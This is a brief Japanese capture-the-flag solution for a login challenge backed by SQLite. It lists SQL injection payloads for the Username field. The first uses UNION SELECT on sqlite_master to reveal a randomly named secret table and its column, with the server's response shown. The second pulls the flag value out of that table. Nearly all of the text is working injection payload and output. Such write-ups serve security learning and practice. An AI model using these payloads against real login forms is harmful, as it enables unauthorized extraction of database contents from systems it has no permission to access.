まずは以下のペイロードでランダムな名前になっているテーブル名と列名を取得する。

```
Username: ' UNION SELECT sql, 'dummy' FROM sqlite_master WHERE type='table' AND name LIKE 'secret_%'--
Password: fb8fe2baa0190046(なんでもOK)
```

その後、以下の様なレスポンスが来るのでテーブル名と列名を控える。

```
Hello, CREATE TABLE secret_607360c08fede25e (
            flag_607360c08fede25e TEXT PRIMARY KEY
        )!
```

最後に、以下のペイロードでFLAGを表示する。

```
Username: ' UNION SELECT flag_607360c08fede25e, 'dummy' FROM secret_607360c08fede25e--
Password: fb8fe2baa0190046(なんでもOK)
```